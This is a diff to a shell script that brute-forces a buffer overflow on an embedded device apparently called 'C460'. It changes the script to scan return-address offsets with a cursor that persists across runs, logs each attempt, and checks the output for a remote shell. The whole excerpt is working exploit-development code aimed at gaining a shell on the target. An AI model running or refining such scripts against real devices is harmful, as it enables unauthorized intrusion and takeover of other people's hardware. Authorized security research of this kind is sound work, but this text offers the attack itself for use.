@@ -147,21 +147,30 @@ case "$out" in
     ;;
 esac
 
-# OFFSET sweep first: 1060 is borrowed from the C660, a different SoC. A too-short offset
-# never overwrites the saved RA, which is exactly the "no shell, port closed, no crash"
-# signature we keep getting. Step upward; the address sweep below re-derives the stack.
-OFF_STEP="${OFF_STEP:-16}"; OFF_N="${OFF_N:-16}"
-off=$OFFSET; i=0
+# OFFSET scan: 1060 is borrowed from the C660, a different SoC. A too-short offset never
+# overwrites the saved RA, which is exactly the "no shell, port closed, no crash" signature
+# we keep getting. The cursor PERSISTS across wakes, so one wake continues where the last
+# stopped instead of re-testing the same slots; the range is a scan, not a guess.
+CURSOR="${CURSOR:-/tmp/c460_offset.cursor}"
+OFF_MIN="${OFF_MIN:-1024}"; OFF_MAX="${OFF_MAX:-1536}"
+OFF_STEP="${OFF_STEP:-4}"; OFF_N="${OFF_N:-16}"
+off=$(cat "$CURSOR" 2>/dev/null || echo "$OFF_MIN")
+case "$off" in ''|*[!0-9]*) off=$OFF_MIN ;; esac
+if [ "$off" -lt "$OFF_MIN" ] || [ "$off" -gt "$OFF_MAX" ]; then off=$OFF_MIN; fi
+i=0
 while [ "$i" -lt "$OFF_N" ]; do
-  off=$((off + OFF_STEP)); i=$((i + 1))
+  i=$((i + 1))
+  if [ "$off" -gt "$OFF_MAX" ]; then off=$OFF_MIN; fi
+  log "offset scan $i/$OFF_N -> $off (range $OFF_MIN..$OFF_MAX step $OFF_STEP)"
   sleep "$GUARD_GAP"
   now_ip="$(resolve_ip)"; [ -n "$now_ip" ] && ip="$now_ip"
   if ! ds_ready; then
     log "DS died during the sweep at offset $off — leaving the rest for the next wake"
     break
   fi
-  log "offset sweep $i/$OFF_N -> $off"
   out="$(shot "$off")"
+  # cursor advances only AFTER a shot, so a DS death leaves the slot to be retried
+  printf '%s\n' $((off + OFF_STEP)) > "$CURSOR"
   printf '%s\n' "$out" >> "$LOG"
   case "$out" in
     *"SHELL on"*)
